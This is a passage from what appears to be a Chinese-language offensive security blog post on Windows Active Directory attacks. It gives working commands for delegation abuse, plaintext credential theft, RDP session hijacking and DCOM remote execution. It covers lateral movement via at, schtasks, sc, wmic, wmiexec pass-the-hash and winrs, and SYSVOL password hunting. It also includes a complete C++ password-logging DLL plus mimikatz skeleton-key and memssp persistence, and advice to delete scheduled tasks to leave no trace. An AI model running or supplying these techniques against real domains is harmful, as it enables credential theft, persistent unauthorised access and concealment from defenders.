alt="QQ截图20210217140659"></p><p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p><p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p><p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p><p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p><p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p><h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p><p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p><p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p><p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p><p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p><p>完事</p><h2 id="credssp-导出用户明文密码"><a href="#credssp-导出用户明文密码" class="headerlink" title="credssp 导出用户明文密码"></a>credssp 导出用户明文密码</h2><p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。</p><p>我们在配置这个协议时，一般在组策略编辑器里配置。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png" alt="QQ截图20210217143231"></p><p>Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>那么这样看，这个攻击流程就很自然了。<br>我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。<br>在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。<br>然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br></pre></td></tr></table></figure><p>一股脑设置好就完事了。。（用户需重新登陆才生效）</p><p>然后开始获取密码</p><p>我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。<br>我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tsssp::server 开启服务端</span><br><span class="line">tsssp::client &#x2F;target:...   开启客户端，这里的target随便填</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png" alt="QQ截图20210217143306"></p><p>那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。</p><p>服务端建立: tsssp::server 需要SYSTEM权限</p><p>客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png" alt="QQ截图20210217143322"></p><h2 id="tscon横向"><a href="#tscon横向" class="headerlink" title="tscon横向"></a>tscon横向</h2><p>若一个机器上有多个用户登录，则在任务管理器可以看见如下场面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png" alt="QQ截图20210217143439"></p><p>其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png" alt="QQ截图20210217143500"></p><p>但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。<br>比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。</p><p>query user 获得administrator用户的id</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png" alt="QQ截图20210217143547"></p><p>可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。</p><p>cmd /k tscon 2 /dest:console</p><p>执行以上命令，我们跳转到了admin的桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png" alt="QQ截图20210217143616"></p><h2 id="利用COM-DCOM对象"><a href="#利用COM-DCOM对象" class="headerlink" title="利用COM/DCOM对象"></a>利用COM/DCOM对象</h2><p>参考:<a href="https://www.freebuf.com/articles/network/256372.html">https://www.freebuf.com/articles/network/256372.html</a> </p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。<br>这里简要说一下几个有关COM的概念</p><p>CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D}</p><p>ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联</p><p>Appid: 为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问</p><p>我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png" alt="image-20210223152713449"></p><p>远程DCOM对象实例化的流程:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。</span><br><span class="line">远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。</span><br><span class="line">DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。</span><br><span class="line">客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。</span><br></pre></td></tr></table></figure><h3 id="MMC20-APPLICATION-1"><a href="#MMC20-APPLICATION-1" class="headerlink" title="MMC20.APPLICATION.1"></a>MMC20.APPLICATION.1</h3><p>中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。 我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png" alt="image-20210223161553486"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png" alt="image-20210223160909543"></p><p>如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecuteShellCommand（[命令][目录][叁数][窗口状态]）</span><br><span class="line">命令</span><br><span class="line">一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。</span><br><span class="line"></span><br><span class="line">窗口状态</span><br><span class="line">一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。</span><br><span class="line"></span><br><span class="line">“Maximized”</span><br><span class="line">该命令在最大化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Minimized”</span><br><span class="line">该命令在最小化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Restored”</span><br><span class="line">该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">此方法不返回值。</span><br></pre></td></tr></table></figure><p>于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png" alt="image-20210223161252812"></p><p>我们进一步发掘其横向移动的能力</p><p>我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。<br>GetTypeFromProgID(“COM”,”远程ip”) 即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ，“远程ip”)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;)</span><br></pre></td></tr></table></figure><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="ipc简介"><a href="#ipc简介" class="headerlink" title="ipc简介"></a>ipc简介</h3><p>IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。ipc共享连接成功后一般能共享所有共享盘符。（也就是IPC连接后可以远程共享C$,D$等）</p><p>利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p>如果账户和口令正确，就建立好了链接。</p><p>建立好链接后就能执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.183.130\c$ 列出C盘</span><br><span class="line">copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件</span><br><span class="line">tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 列出某IP上的进程信息，&#x2F;U指定哪个用户执行该命令，&#x2F;p指定该用户密码</span><br><span class="line">net use \\IP &#x2F;del &#x2F;y 删除链接</span><br><span class="line">net use 查看已建立的ipc链接</span><br></pre></td></tr></table></figure><h3 id="利用ipc横向移动"><a href="#利用ipc横向移动" class="headerlink" title="利用ipc横向移动"></a>利用ipc横向移动</h3><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;命令&gt;&quot;</span><br><span class="line">at \\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;命令&gt;&quot;</span><br></pre></td></tr></table></figure><p>关于时间的获得，可以使用 net time \\IP 获得。</p><p>计划任务执行后需要删除，不留痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 1 &#x2F;delete  &#x2F;&#x2F;1为任务的ID</span><br></pre></td></tr></table></figure><p>关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等</p><h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a><strong>schtasks</strong></h4><p>at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。</p><p>横向移动的大致思路与at差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1  &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f </span><br><span class="line"></span><br><span class="line">但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码 </span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f</span><br><span class="line"></span><br><span class="line">另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上&#x2F;u &#x2F;p参数）</span><br><span class="line">schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor  &#x2F;&#x2F; i：忽略任何限制立即运行任务</span><br><span class="line"></span><br><span class="line">计划任务执行后需要清理痕迹</span><br><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><p>这个命令可以操控服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\[主机名&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot;   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令</span><br><span class="line">sc \\[host] start [servicename] 启动某个服务</span><br><span class="line">sc \\[host] delete [servicename]   #删除服务</span><br></pre></td></tr></table></figure><h2 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h2><p>从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。</p><p>通过wmic在远程主机上开启进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot;</span><br></pre></td></tr></table></figure><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>通过wmic创建远程进程时，不会有回显，需要通过ipc$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。具体原理是通过wmic在135端口进行交互，再把内容通过445端口传回来。</p><p>wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。<br>(exe版本网上似乎很不好找) 这里用python版本，下载链接<a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22%EF%BC%8C">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，</a> impacket按照网上安装来弄就行了<br>1.环境linux，我们配置好proxychanis代入内网（略<br>2.proxychains wmiexec.py 域名/用户名:密码@ip  获得shell<br>3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP </p><p>效果图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png" alt="image-20210226204713405"></p><h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><p>​    winRm（微软远程管理）是WS-Management协议的实现组件。WinRM是windows操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过HTTP（5985）或HTTPS SOAP（5986）执行，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 你需要管理员身份才能使用它。<br>​    适用版本:适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>我们可以通过如下powershell命令查看机器上的winrm是否正常运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png" alt="image-20210226223701342"></p><p>若没开启，你可以在管理员权限下执行以下指令开启</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">or</span><br><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure><p>远程命令执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami</span><br></pre></td></tr></table></figure><h2 id="利用组策略"><a href="#利用组策略" class="headerlink" title="利用组策略"></a>利用组策略</h2><h3 id="读取脚本中的密码"><a href="#读取脚本中的密码" class="headerlink" title="读取脚本中的密码"></a>读取脚本中的密码</h3><p>假设域管想通过组策略来修改用户密码，如果他不使用GPP，那么他只有通过GPO配合脚本下发的方式来修改用户密码。</p><p>这种脚本可能会长得像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;123QWEQWE!@#&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure><p>保存这个脚本为<code>cpass.vbs</code>,这个脚本的作用就是修改本地管理员账户的密码为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123QWEQWE!@#</span><br></pre></td></tr></table></figure><p>然后通过GPO下发此脚本，该脚本就会被保存于SYSVOL文件夹中。<br>又因为域中任何用户都可以读取SYSVOL文件夹中内容，所以我们指不定就会翻到这种暴露明文密码的脚本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure><h3 id="批量密码"><a href="#批量密码" class="headerlink" title="批量密码"></a>批量密码</h3><p>域管可能会用组策略批量修改域中用户密码（特别是本地管理员）。所以拿到一个本地管理员密码后不妨试试密码复用，指不定就有惊喜</p><h1 id="域管权限维持"><a href="#域管权限维持" class="headerlink" title="域管权限维持"></a>域管权限维持</h1><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文.</p><p>Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>以及 <a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> 的HookPasswordChange.dll(需自行编译)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure><p>执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。</p><p>下面我们分析一下原理</p><p>当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png" alt="QQ截图20210217133057"></p><p>该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。<br>这种方式一般在Server服务器上利用率较高<br>通常来说，这个dll文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa的 notification packages表项。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png" alt="QQ截图20210217133116"></p><p>我们要利用该方法，首先要确保密码策略已启用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png" alt="QQ截图20210217133138"></p><p>至于命令行怎么修改。可以这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet   将组策略导出为文件</span><br><span class="line">在该文件里将PasswordComplexity项值修改为1</span><br><span class="line">然后用secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet 将其导入数据库</span><br><span class="line">刷新组策略： gpupdate&#x2F;force</span><br><span class="line">重启后生效</span><br></pre></td></tr></table></figure><p>下面我们构造dll文件去覆盖它。</p><p>首先我们的dll文件内容如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;NTSecAPI.h&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123;</span><br><span class="line">OutputDebugString(L&quot;InitializeChangeNotify&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(</span><br><span class="line">PUNICODE_STRING AccountName,</span><br><span class="line">PUNICODE_STRING FullName,</span><br><span class="line">PUNICODE_STRING Password,</span><br><span class="line">BOOLEAN SetOperation)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(L&quot;PasswordFilter&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(</span><br><span class="line">PUNICODE_STRING UserName,</span><br><span class="line">ULONG RelativeId,</span><br><span class="line">PUNICODE_STRING NewPassword)</span><br><span class="line">&#123;</span><br><span class="line">FILE *pFile;</span><br><span class="line">fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);</span><br><span class="line">fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f</span><br></pre></td></tr></table></figure><p>重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# misc::skeleton</span><br></pre></td></tr></table></figure><p>然后所有用户都能用密码 mimiaktz登陆了</p><h2 id="SSP注入"><a href="#SSP注入" class="headerlink" title="SSP注入"></a>SSP注入</h2><p>ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exe<br>sspi:SSP的API接口</p><p>如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码</p><p>临时性注入(重启便失效)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimiaktz# misc::memssp</span><br></pre></td></tr></table></figure><p>执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。</p><p><img 